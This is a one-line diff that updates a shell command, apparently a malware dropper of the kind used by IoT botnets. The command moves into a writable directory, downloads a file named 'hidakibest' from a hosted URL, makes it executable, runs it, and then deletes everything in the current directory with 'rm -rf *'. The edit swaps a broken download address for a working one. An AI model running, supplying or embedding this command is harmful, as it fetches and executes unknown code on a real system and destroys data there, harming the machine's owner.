@@ -1,1 +1,1 @@
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http:///hidakibest.sh; chmod 777 hidakibest.sh; sh hidakibest.sh; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/234exv/adf/main/hidakibest.x86; chmod 777 hidakibest.x86; sh hidakibest.x86; rm -rf *
